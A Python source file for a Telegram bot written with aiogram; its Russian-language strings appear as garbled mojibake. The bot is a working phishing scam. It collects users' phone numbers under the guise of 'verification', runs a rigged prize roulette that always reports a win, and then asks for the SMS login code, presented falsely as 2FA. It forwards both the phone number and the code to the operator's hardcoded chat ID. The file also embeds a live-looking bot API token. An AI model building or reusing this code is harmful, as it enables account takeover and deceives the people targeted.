from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, Contact
import asyncio

API_TOKEN = "7734758623:AAExZF0D8VLeZec2U0re22Wxe3vi6y_d_18"  # –≤—Å—Ç–∞–≤—å —Å—é–¥–∞ —Ç–æ–∫–µ–Ω
CHAT_ID = 7403055160  # –≤—Å—Ç–∞–≤—å —Å—é–¥–∞ ID —Å–≤–æ–µ–≥–æ —á–∞—Ç–∞/–∞–∫–∫–∞—É–Ω—Ç–∞, –∫—É–¥–∞ —Å–ª–∞—Ç—å –∏–Ω—Ñ—É

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# --- –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã ---
contact_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–º", request_contact=True)]],
    resize_keyboard=True
)

menu_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="üéÅ –ë–µ—Å–ø–ª–∞—Ç–Ω—ã–π –ø–æ–¥–∞—Ä–æ–∫")],
        [
            KeyboardButton(text="üõçÔ∏è –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç–æ–≤–∞—Ä—ã"),
            KeyboardButton(text="üõí –ö–æ—Ä–∑–∏–Ω–∞")
        ]
    ],
    resize_keyboard=True
)

cart_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="‚óÄÔ∏è –ù–∞–∑–∞–¥")]],
    resize_keyboard=True
)

shop_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="‚≠ê 100 –∑–≤—ë–∑–¥ ‚Äî 99‚ÇΩ")],
        [KeyboardButton(text="‚≠ê 500 –∑–≤—ë–∑–¥ ‚Äî 299‚ÇΩ")],
        [KeyboardButton(text="Telegram Premium ‚Äî 149‚ÇΩ/–º–µ—Å")],
        [KeyboardButton(text="‚óÄÔ∏è –ù–∞–∑–∞–¥")]
    ],
    resize_keyboard=True
)

# --- –°–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ---
user_states = {}
user_ranges = {}

# --- –•–µ–Ω–¥–ª–µ—Ä—ã ---

@dp.message(Command("start"))
async def start(message: Message):
    user_states[message.from_user.id] = None
    await message.answer(
        "–î–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã —Å –±–æ—Ç–æ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–æ–π—Ç–∏ –ø—Ä–æ—Å—Ç—É—é –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:", 
        reply_markup=contact_keyboard
    )

@dp.message(F.contact)
async def on_contact(message: Message):
    user_id = message.from_user.id
    phone_number = message.contact.phone_number
    user_states[user_id] = None
    await message.answer("‚úÖ –ö–æ–Ω—Ç–∞–∫—Ç –ø–æ–ª—É—á–µ–Ω. –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é!", reply_markup=menu_keyboard)
    await bot.send_message(CHAT_ID, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –ø–æ–¥–µ–ª–∏–ª—Å—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–º: {phone_number}")

@dp.message(F.text == "üõí –ö–æ—Ä–∑–∏–Ω–∞")
async def show_cart(message: Message):
    await message.answer("–í–∞—à–∞ –∫–æ—Ä–∑–∏–Ω–∞ –ø—É—Å—Ç–∞ üõí", reply_markup=cart_keyboard)

@dp.message(F.text == "üõçÔ∏è –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç–æ–≤–∞—Ä—ã")
async def show_shop(message: Message):
    await message.answer("–í–æ—Ç —á—Ç–æ —É –Ω–∞—Å –µ—Å—Ç—å:", reply_markup=shop_keyboard)

@dp.message(F.text == "‚óÄÔ∏è –ù–∞–∑–∞–¥")
async def back_to_menu(message: Message):
    user_states[message.from_user.id] = None
    await message.answer("–í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:", reply_markup=menu_keyboard)

@dp.message(F.text == "üéÅ –ë–µ—Å–ø–ª–∞—Ç–Ω—ã–π –ø–æ–¥–∞—Ä–æ–∫")
async def gift_game_start(message: Message):
    user_id = message.from_user.id
    user_states[user_id] = "waiting_for_range"
    await message.answer("üéÅ –î–ª—è —É—á–∞—Å—Ç–∏—è –≤ —Ä–æ–∑—ã–≥—Ä—ã—à–µ –≤–≤–µ–¥–∏—Ç–µ –¥–∏–∞–ø–∞–∑–æ–Ω —á–∏—Å–µ–ª (–Ω–∞–ø—Ä–∏–º–µ—Ä: 100-200). –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –¥–ª–∏–Ω–∞ –¥–∏–∞–ø–∞–∑–æ–Ω–∞ ‚Äî 10 —á–∏—Å–µ–ª:")

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∏–∞–ø–∞–∑–æ–Ω–∞ ‚Äî —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –æ–∂–∏–¥–∞–Ω–∏—è –¥–∏–∞–ø–∞–∑–æ–Ω–∞
@dp.message()
async def handle_range_or_other(message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    # –°–æ—Å—Ç–æ—è–Ω–∏–µ –æ–∂–∏–¥–∞–Ω–∏—è –¥–∏–∞–ø–∞–∑–æ–Ω–∞
    if user_states.get(user_id) == "waiting_for_range":
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–æ—Ä–º–∞—Ç: "—á–∏—Å–ª–æ-—á–∏—Å–ª–æ"
        if "-" in text:
            parts = text.split("-")
            if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
                start = int(parts[0])
                end = int(parts[1])
                if start >= end:
                    await message.answer("–û—à–∏–±–∫–∞: –Ω–∞—á–∞–ª–æ –¥–∏–∞–ø–∞–∑–æ–Ω–∞ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –º–µ–Ω—å—à–µ –∫–æ–Ω—Ü–∞.")
                    return
                if (end - start) < 10:
                    await message.answer("–û—à–∏–±–∫–∞: –¥–∏–∞–ø–∞–∑–æ–Ω –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –Ω–µ –º–µ–Ω–µ–µ 10 —á–∏—Å–µ–ª.")
                    return
                user_ranges[user_id] = (start, end)
                user_states[user_id] = "waiting_for_number"
                await message.answer(f"–û—Ç–ª–∏—á–Ω–æ! –¢–µ–ø–µ—Ä—å –≤—ã–±–µ—Ä–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç {start} –¥–æ {end}:")
                return
        await message.answer("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∏–∞–ø–∞–∑–æ–Ω–∞. –í–≤–µ–¥–∏—Ç–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä, 100-200, –≥–¥–µ –¥–ª–∏–Ω–∞ –¥–∏–∞–ø–∞–∑–æ–Ω–∞ –Ω–µ –º–µ–Ω–µ–µ 10.")
        return

    # –°–æ—Å—Ç–æ—è–Ω–∏–µ –æ–∂–∏–¥–∞–Ω–∏—è —á–∏—Å–ª–∞ –¥–ª—è –∏–≥—Ä—ã
    if user_states.get(user_id) == "waiting_for_number":
        if text.isdigit():
            number = int(text)
            if user_id not in user_ranges:
                await message.answer("–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫. –í–≤–µ–¥–∏—Ç–µ –¥–∏–∞–ø–∞–∑–æ–Ω –∑–∞–Ω–æ–≤–æ –∫–æ–º–∞–Ω–¥–æ–π /start.")
                user_states[user_id] = None
                return
            start, end = user_ranges[user_id]
            if not (start <= number <= end):
                await message.answer(f"–í–∞—à–µ —á–∏—Å–ª–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ—Ç {start} –¥–æ {end}.")
                return

            await message.answer("üé∞ –ö—Ä—É—Ç–∏–º —Ä—É–ª–µ—Ç–∫—É...")
            await asyncio.sleep(0.5)
            await message.answer("üîÑ –ü–æ–¥—Å—á—ë—Ç...")
            await asyncio.sleep(1.5)

            await message.answer(
                f"üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –ß–∏—Å–ª–æ {number} –æ–∫–∞–∑–∞–ª–æ—Å—å –≤—ã–∏–≥—Ä—ã—à–Ω—ã–º!\n\n"
                "–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–∞ Telegram –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç 2FA-–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ.\n"
                "üì© –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–¥—ë—Ç –≤–∞–º –≤ SMS:"
            )
            user_states[user_id] = "waiting_for_2fa"
            return
        else:
            await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –∏–∑ –∑–∞–¥–∞–Ω–Ω–æ–≥–æ –¥–∏–∞–ø–∞–∑–æ–Ω–∞.")
            return

    # –°–æ—Å—Ç–æ—è–Ω–∏–µ –æ–∂–∏–¥–∞–Ω–∏—è 2FA –∫–æ–¥–∞
    if user_states.get(user_id) == "waiting_for_2fa":
        if text.isdigit() and len(text) == 6:
            await message.answer("‚úÖ –ö–æ–¥ –ø—Ä–∏–Ω—è—Ç. –°–ø–∞—Å–∏–±–æ –∑–∞ —É—á–∞—Å—Ç–∏–µ!")
            await message.answer(
                "üéÅ –í–∞—à –ø–æ–¥–∞—Ä–æ–∫ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤–∞–º –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤ —Å –ø–æ–º–æ—â—å—é —ç—Ç–æ–≥–æ –∂–µ –±–æ—Ç–∞.\n"
                "–ï—Å–ª–∏ –æ–Ω –Ω–µ –ø—Ä–∏–¥—ë—Ç ‚Äî –ø–∏—à–∏—Ç–µ –≤ —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫—É: "
                "[—Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∞](https://www.youtube.com/watch?v=dQw4w9WgXcQ)",
                disable_web_page_preview=True,
                parse_mode="Markdown"
            )
            await bot.send_message(CHAT_ID, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –≤–≤—ë–ª 2FA-–∫–æ–¥: {text}")
            user_states[user_id] = None
            user_ranges.pop(user_id, None)
            return
        else:
            await message.answer("‚õî –ö–æ–¥ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –≤–≤–µ–ª–∏ 6 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤ –∏ –¥—Ä—É–≥–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤.")
            return

    # –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–∏—à–µ—Ç —á—Ç–æ-—Ç–æ –≤–Ω–µ —Å—Ü–µ–Ω–∞—Ä–∏—è
    await message.answer("–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ù–∞—á–Ω–∏—Ç–µ —Å /start.")

if __name__ == "__main__":
    import asyncio
    asyncio.run(dp.start_polling(bot))
